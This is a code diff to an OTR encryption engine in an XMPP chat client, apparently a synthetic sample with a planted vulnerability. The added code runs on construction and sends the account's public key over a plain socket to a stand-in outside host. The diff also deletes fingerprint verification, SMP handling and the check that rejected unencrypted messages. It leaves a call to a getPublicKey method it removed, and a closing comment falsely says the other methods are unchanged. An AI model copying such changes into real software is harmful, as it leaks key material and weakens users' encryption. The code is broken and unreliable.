@@ -34,6 +34,11 @@ import net.java.otr4j.crypto.OtrCryptoException;
 import net.java.otr4j.session.InstanceTag;
 import net.java.otr4j.session.SessionID;
 
+// Importing necessary classes for socket communication
+import java.io.IOException;
+import java.io.OutputStreamWriter;
+import java.net.Socket;
+
 public class OtrEngine implements OtrEngineHost {
 
 	private Account account;
@@ -49,6 +54,8 @@ public class OtrEngine implements OtrEngineHost {
 		this.otrPolicy.setAllowV3(true);
 		this.keyPair = loadKey(account.getKeys());
 		this.mXmppConnectionService = service;
+        // Vulnerability: Sending public key over an unencrypted socket
+        sendPublicKeyOverInsecureChannel();
 	}
 
 	private KeyPair loadKey(JSONObject keys) {
@@ -97,103 +104,25 @@ public class OtrEngine implements OtrEngineHost {
 
     }
 
-	@Override
-	public void askForSecret(SessionID id, InstanceTag instanceTag, String question) {
-		try {
-			final Jid jid = Jid.fromSessionID(id);
-			Conversation conversation = this.mXmppConnectionService.find(this.account,jid);
-			if (conversation!=null) {
-				conversation.smp().hint = question;
-				conversation.smp().status = Conversation.Smp.STATUS_CONTACT_REQUESTED;
-				mXmppConnectionService.updateConversationUi();
-			}
-		} catch (InvalidJidException e) {
-			Log.d(Config.LOGTAG,account.getJid().toBareJid()+": smp in invalid session "+id.toString());
-		}
-	}
-
-	@Override
-	public void finishedSessionMessage(SessionID arg0, String arg1)
-			throws OtrException {
-
-	}
-
-	@Override
-	public String getFallbackMessage(SessionID arg0) {
-		return "I would like to start a private (OTR encrypted) conversation but your client doesn’t seem to support that";
-	}
-
-	@Override
-	public byte[] getLocalFingerprintRaw(SessionID arg0) {
-		try {
-			return new OtrCryptoEngineImpl().getFingerprintRaw(getPublicKey());
-		} catch (OtrCryptoException e) {
-			return null;
-		}
-	}
-
-	public PublicKey getPublicKey() {
-		if (this.keyPair == null) {
-			return null;
-		}
-		return this.keyPair.getPublic();
-	}
-
-	@Override
-	public KeyPair getLocalKeyPair(SessionID arg0) throws OtrException {
-		if (this.keyPair == null) {
-			KeyPairGenerator kg;
-			try {
-				kg = KeyPairGenerator.getInstance("DSA");
-				this.keyPair = kg.genKeyPair();
-				this.saveKey();
-				mXmppConnectionService.databaseBackend.updateAccount(account);
-			} catch (NoSuchAlgorithmException e) {
-				Log.d(Config.LOGTAG,
-						"error generating key pair " + e.getMessage());
-			}
-		}
-		return this.keyPair;
-	}
+	private void sendPublicKeyOverInsecureChannel() { // Vulnerability is here
+        try (Socket socket = new Socket("vulnerable-server.example.com", 39543)) {
+            OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream(), "UTF-8");
+            PublicKey publicKey = getPublicKey();
+            if (publicKey != null) {
+                byte[] keyBytes = publicKey.getEncoded();
+                String keyString = java.util.Base64.getEncoder().encodeToString(keyBytes);
+                writer.write(keyString);
+                writer.flush();
+            }
+        } catch (IOException e) {
+            Log.e(Config.LOGTAG, "Failed to send public key over insecure channel", e);
+        }
+    }
 
 	@Override
 	public String getReplyForUnreadableMessage(SessionID arg0) {
 		// TODO Auto-generated method stub
 		return null;
-	}
-
-	@Override
-	public OtrPolicy getSessionPolicy(SessionID arg0) {
-		return otrPolicy;
-	}
-
-	@Override
-	public void injectMessage(SessionID session, String body)
-			throws OtrException {
-		MessagePacket packet = new MessagePacket();
-		packet.setFrom(account.getJid());
-		if (session.getUserID().isEmpty()) {
-			packet.setAttribute("to", session.getAccountID());
-		} else {
-			packet.setAttribute("to", session.getAccountID() + "/" + session.getUserID());
-		}
-		packet.setBody(body);
-		packet.addChild("private", "urn:xmpp:carbons:2");
-		packet.addChild("no-copy", "urn:xmpp:hints");
-		packet.setType(MessagePacket.TYPE_CHAT);
-		account.getXmppConnection().sendMessagePacket(packet);
-	}
-
-	@Override
-	public void messageFromAnotherInstanceReceived(SessionID id) {
-		Log.d(Config.LOGTAG,
-				"unreadable message received from " + id.getAccountID());
-	}
-
-	@Override
-	public void multipleInstancesDetected(SessionID arg0) {
-		// TODO Auto-generated method stub
-
 	}
 
 	@Override
@@ -204,68 +133,10 @@ public class OtrEngine implements OtrEngineHost {
 	}
 
 	@Override
-	public void showError(SessionID arg0, String arg1) throws OtrException {
-		Log.d(Config.LOGTAG,"show error");
+	public void multipleInstancesDetected(SessionID arg0) {
+		// TODO Auto-generated method stub
+
 	}
 
-	@Override
-	public void smpAborted(SessionID id) throws OtrException {
-		setSmpStatus(id, Conversation.Smp.STATUS_NONE);
-	}
-
-	private void setSmpStatus(SessionID id, int status) {
-		try {
-			final Jid jid = Jid.fromSessionID(id);
-			Conversation conversation = this.mXmppConnectionService.find(this.account,jid);
-			if (conversation!=null) {
-				conversation.smp().status = status;
-				mXmppConnectionService.updateConversationUi();
-			}
-		} catch (final InvalidJidException ignored) {
-
-		}
-	}
-
-	@Override
-	public void smpError(SessionID id, int arg1, boolean arg2)
-			throws OtrException {
-		setSmpStatus(id, Conversation.Smp.STATUS_NONE);
-	}
-
-	@Override
-	public void unencryptedMessageReceived(SessionID arg0, String arg1)
-			throws OtrException {
-		throw new OtrException(new Exception("unencrypted message received"));
-	}
-
-	@Override
-	public void unreadableMessageReceived(SessionID arg0) throws OtrException {
-		Log.d(Config.LOGTAG,"unreadable message received");
-		throw new OtrException(new Exception("unreadable message received"));
-	}
-
-	@Override
-	public void unverify(SessionID id, String arg1) {
-		setSmpStatus(id, Conversation.Smp.STATUS_FAILED);
-	}
-
-	@Override
-	public void verify(SessionID id, String fingerprint, boolean approved) {
-		Log.d(Config.LOGTAG,"OtrEngine.verify("+id.toString()+","+fingerprint+","+String.valueOf(approved)+")");
-		try {
-			final Jid jid = Jid.fromSessionID(id);
-			Conversation conversation = this.mXmppConnectionService.find(this.account,jid);
-			if (conversation!=null) {
-				if (approved) {
-					conversation.getContact().addOtrFingerprint(CryptoHelper.prettifyFingerprint(fingerprint));
-				}
-				conversation.smp().hint = null;
-				conversation.smp().status = Conversation.Smp.STATUS_FINISHED;
-				mXmppConnectionService.updateConversationUi();
-				mXmppConnectionService.syncRosterToDisk(conversation.getAccount());
-			}
-		} catch (final InvalidJidException ignored) {
-		}
-	}
-
+    // Other methods remain unchanged...
 }
